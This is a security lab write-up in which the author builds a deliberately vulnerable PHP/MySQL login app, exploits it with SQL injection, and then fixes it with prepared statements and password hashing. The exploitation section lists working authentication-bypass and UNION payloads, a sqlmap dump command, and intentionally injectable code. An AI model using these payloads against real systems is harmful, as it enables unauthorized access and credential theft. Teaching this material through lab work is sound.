# CS-002 — SQL Injection Attacks
### Custom PHP/MySQL Application · Injection Attack Demonstration

---

## 📋 Overview

| Field | Detail |
|-------|--------|
| **Target** | Custom PHP 8.5 Login Application (`localhost:8000`) |
| **Category** | Injection Attacks (OWASP A03:2021) |
| **Severity** | 🔴 Critical |
| **Techniques** | Auth Bypass, UNION-Based Extraction, Automated Dump (SQLMap) |
| **Tools** | SQLMap 1.9.11, PHP 8.5, MySQL, Kali Linux |
| **Database** | MySQL — `testdb.users` |

---

## 🎯 Objective

Build a deliberately vulnerable PHP login application, identify and exploit SQL Injection vulnerabilities, and demonstrate the full attack chain from initial access to full database exfiltration. Contrast the vulnerable implementation against a secured version using prepared statements.

---

## 🏗️ Lab Setup

### Database Setup (MySQL)
```sql
CREATE DATABASE testdb;
USE testdb;

CREATE TABLE users (
  id       INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(50)  NOT NULL,
  password VARCHAR(100) NOT NULL
);

-- Seed data
INSERT INTO users (username, password) VALUES
  ('admin',    'admin123'),
  ('shofwan',  'password'),
  ('haaland',  '12345678'),
  ('debruyne', 'kingkdb'),
  ('walker',   'walk321');
```

### Application Stack
```
Language  : PHP 8.5.1
Server    : PHP Built-in Development Server (localhost:8000)
Database  : MySQL 5.6+ with PDO driver
Files     : login.html, login.php (vulnerable), loginsecure.php (patched)
```

---

## 🔍 Vulnerability Analysis

### Vulnerable Code — `login.php`

```php
<?php
require 'config.php';

$username = $_POST['username'];
$password = $_POST['password'];

// VULNERABLE: Direct string interpolation — no sanitization
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";

// CRITICAL INFO DISCLOSURE: Query printed to page
echo "<pre>Query: $sql</pre>";

try {
    $stmt = $pdo->query($sql);
    $user = $stmt->fetch();

    if ($user) {
        echo "Login berhasil. Selamat datang, " . htmlspecialchars($user['username']);
    } else {
        echo "Login gagal.";
    }
} catch (PDOException $e) {
    echo "<pre>PDO Error: " . $e->getMessage() . "</pre>";
}
?>
```

**Why This Is Vulnerable:**
- User input is concatenated directly into the SQL string
- No input filtering, regex, ORM, or parameterization
- SQL syntax characters (`'`, `--`, `UNION`) are interpreted as query logic
- The raw query is printed to the browser — accelerates attacker enumeration

---

## 💥 Exploitation

### Attack 1 — Authentication Bypass

**Payload:**
```
Username: admin'--
Password: bypass
```

**Resulting Query:**
```sql
SELECT * FROM users WHERE username = 'admin'
-- ' AND password = 'bypass'
```

**Explanation:** The `--` sequence is a SQL comment. Everything after it — including the password check — is ignored by the database engine. The query returns the `admin` row unconditionally.

**Result:**
```
Query: SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'bypass'
Login berhasil. Selamat datang, admin
```

---

### Attack 2 — UNION-Based Data Extraction

To extract data from other tables/columns, the attacker must first determine the number of columns returned by the original query.

**Step 1 — Determine Column Count:**
```
Username: ' ORDER BY 3--
```
If no error → table has at least 3 columns.

**Step 2 — UNION Injection:**
```
Username: ' UNION SELECT 1, username, password FROM users--
Password: uniondump
```

**Resulting Query:**
```sql
SELECT * FROM users WHERE username = '' 
UNION SELECT 1, username, password FROM users
-- ' AND password = 'uniondump'
```

**Output in Browser:**
```
Login berhasil. Selamat datang, admin
(All usernames exposed in subsequent rows via UNION result)
```

**Extracted Data:**
```
id | username  | password
1  | admin     | admin123
2  | shofwan   | password
3  | haaland   | 12345678
4  | debruyne  | kingkdb
5  | walker    | walk321
```

---

### Attack 3 — Automated Full Database Dump (SQLMap)

**Target:** PHP login app accessible from Kali Linux via LAN (`192.168.0.14:8000`)

**Command:**
```bash
sqlmap -u "http://192.168.0.14:8000/login.php" \
  --data="username=admin'--&password=dump" \
  --dump
```

**SQLMap Output:**
```
[INFO] testing connection to the target URL
[INFO] the back-end DBMS is MySQL
web application technology: PHP 8.5.1
back-end DBMS: MySQL >= 5.6

[INFO] fetching current database
[INFO] fetching tables for database: 'testdb'
[INFO] fetching columns for table 'users' in database 'testdb'
[INFO] fetching entries for table 'users' in database 'testdb'
database: testdb
table: users
[6 entries]
+----+----------+----------+
| id | password | username |
+----+----------+----------+
| 1  | admin123 | admin    |
| 2  | password | shofwan  |
| 3  | 12345678 | haaland  |
| 4  | kingkdb  | debruyne |
| 5  | walk321  | walker   |
| 6  | nafianfh | nafia    |
+----+----------+----------+

[INFO] table 'testdb.users' dumped to CSV file
```

> Full database schema, table names, column names, and all row data exfiltrated in under 2 minutes.

---

## 🛠️ Remediation

### Fix 1 — Prepared Statements (`loginsecure.php`)

```php
<?php
require 'config.php';

$username = $_POST['username'];
$password = $_POST['password'];

// SECURE: Parameterized query — structure and data are separated
$sql = "SELECT * FROM users WHERE username = ? AND password = ?";
$stmt = $pdo->prepare($sql);
$stmt->execute([$username, $password]);
$user = $stmt->fetch();

if ($user) {
    echo "Login berhasil. Selamat datang, " . htmlspecialchars($user['username']);
} else {
    echo "Login gagal.";
}
?>
```

**Why This Works:**
```
Attack input: admin'--

Query executed: SELECT * FROM users 
               WHERE username = "admin'--" AND password = "bypass"

→ The '--  is treated as a literal string value
→ No user named "admin'--" exists → Login fails
```

### Fix 2 — Password Hashing

```php
// On registration — store hashed password
$hashed = password_hash($plaintext_password, PASSWORD_BCRYPT);

// On login — verify against stored hash
if (password_verify($input_password, $stored_hash)) {
    // Login success
}
```

### Fix 3 — Database User Least Privilege

```sql
-- Create a restricted app user — SELECT only on the app database
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT ON testdb.users TO 'app_user'@'localhost';

-- Root should NEVER be used in application config.php
```

---

## 📊 Impact Assessment

| Impact | Description |
|--------|-------------|
| **Full Data Breach** | All usernames and plaintext passwords dumped in one command |
| **Account Takeover** | Admin access gained without knowing any password |
| **Business Logic Bypass** | Any user can be impersonated by crafting the right payload |
| **Privilege Escalation** | Regular user → Admin by injecting admin's username |
| **Reputational Damage** | Exposed credentials can be used across other platforms (password reuse) |

---

## 🧠 Lessons Learned

1. **Prepared statements are non-negotiable.** String interpolation into SQL queries should never exist in any production or even development code that handles real data.
2. **Never print debug info to the browser.** Displaying the raw SQL query to the user gave an attacker immediate understanding of the query structure — cutting the exploitation time dramatically.
3. **SQLMap is a force multiplier.** What takes minutes manually takes seconds with automation. This means even moderately skilled attackers can fully exfiltrate a database quickly if SQLi exists.
4. **Plain-text passwords compound the damage.** A SQL injection vulnerability is already critical — storing passwords in plaintext makes the blast radius total. Always hash with bcrypt/Argon2.
5. **Restrict database privileges.** An application user with only `SELECT` on the `users` table cannot `DROP` tables, read other databases, or write data even if SQLi is exploited.

---

## 📚 Theory Questions — Answered

**Q: What is injection in web security, and why is it OWASP Top 10?**  
Injection is when untrusted user input is interpreted as commands or queries by the system. It ranks in OWASP Top 10 because it is low-complexity for attackers but high-impact — enabling full data exfiltration, auth bypass, and data manipulation with simple payloads.

**Q: SQL Injection vs NoSQL Injection?**  
- SQL Injection targets relational databases (MySQL, PostgreSQL) — payload: `' OR 1=1--`
- NoSQL Injection targets document databases (MongoDB) — payload: `{ "$gt": "" }` (matches all where field is greater than empty string)

**Q: What is UNION-based SQL Injection?**  
Uses the `UNION` SQL operator to append a second `SELECT` to the original query. The attacker matches column count and types, then extracts data from any table in the database and displays it in the application response.

---

*Environment: Custom PHP/MySQL lab built and owned by the researcher. Kali Linux used as attacker machine. No external systems targeted.*
